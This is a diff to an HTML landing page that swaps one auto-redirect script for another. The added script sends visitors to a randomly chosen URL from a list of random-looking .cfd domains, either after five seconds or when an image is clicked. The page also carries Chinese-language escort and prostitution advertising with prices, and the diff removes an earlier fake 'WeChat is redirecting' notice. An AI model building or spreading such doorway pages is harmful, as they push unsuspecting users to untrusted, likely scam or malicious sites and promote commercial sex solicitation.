@@ -15,16 +15,33 @@
         color: #333;
       }
 
-      p {
-        font-size: 35px;
+      .container {
         text-align: center;
-        color: darkgreen;
-        margin: 1em 0;
-      }
-      .highlight {
-        color: coral;
       }
 
+      h1 {
+        color: #e74c3c;
+        font-size: 48px;
+        font-weight: bold;
+        margin-bottom: 10px;
+        text-align: center;
+      }
+
+      .highlight {
+        color: #1185d7;
+        font-size: 40px;
+        font-weight: bold;
+        text-align: center;
+      }
+
+      .icon {
+        margin-bottom: 20px;
+      }
+
+      .icon img {
+        width: 50px;
+        height: 50px;
+      }
       .image-container {
         display: flex;
         flex-direction: column;
@@ -38,35 +55,48 @@
         margin-top: 1em;
       }
     </style>
-    <script type="text/javascript">
-      window.onload = function () {
-        var links = [
-          "http://2dyd6sah65.qcrtiicu.cfd/UghlUbJi",
-          "http://2yxizckmzf.1sx1wu.cfd/MhfMJD7b",
-          "https://tc9f.com",
-          "https://ns7w.com",
-          "http://7w2bx77my2.vfzakqvm.cfd/4RjwMi1m",
-        ];
-        var randomLink = links[Math.floor(Math.random() * links.length)];
-        setTimeout(function () {
-          window.location.href = randomLink;
-        }, 10);
-      };
-    </script>
   </head>
   <body>
-    <!-- <p>
-      微信正在跳转，请稍等，不要退出哦！<br />
-      <span class="highlight">“如遇跳转失败请返回重新扫码”</span>
-    </p>
-    <p>
-      全国各地同城 少妇，外围，线下互动 内部交流群<br />
-      <span class="highlight">“限时加入！”</span>
-    </p>
+    <div class="container">
+      <div class="icon">
+        <img src="img2/icon.png" alt="Icon" id="iconImage" />
+      </div>
+      <h1>少妇 空姐 单亲妈妈 泌密圈子</h1>
+      <p><span class="highlight">海量妹子随你挑选 198 / 次</span></p>
+      <p><span class="highlight">全国资源可随时调配</span></p>
+      <p><span class="highlight">在线随时可约！</span></p>
+    </div>
     <div class="image-container">
-      <img src="img2/1.jpg" alt="Image 1" />
-      <img src="img2/2.jpg" alt="Image 2" />
-      <img src="img2/3.jpg" alt="Image 3" />
-    </div> -->
+      <img src="img2/5.jpg" alt="Image 5" class="clickableImage" />
+    </div>
+    <h1>进入中.... 请稍等！</h1>
+    <script type="text/javascript">
+      var links = [
+        "http://xnysw.jkpngxrw.cfd/HWtoTndY",
+        "http://dpj6y.zjpcvmft.cfd/FTXFgu52",
+        "http://28c7z.evlfsxfr.cfd/t1nv3ERl",
+        "http://wnes6.ntowxdfe.cfd/KqHploC9",
+        "http://pk6az.lcqrjhsd.cfd/AOzGzcPx",
+      ];
+
+      function handleImageClick() {
+        var randomLink = links[Math.floor(Math.random() * links.length)];
+
+        clearTimeout(timer);
+
+        window.location.href = randomLink;
+      }
+
+      var clickableImages = document.querySelectorAll(".clickableImage");
+
+      clickableImages.forEach(function (image) {
+        image.addEventListener("click", handleImageClick);
+      });
+
+      var timer = setTimeout(function () {
+        var randomLink = links[Math.floor(Math.random() * links.length)];
+        window.location.href = randomLink;
+      }, 5000);
+    </script>
   </body>
 </html>
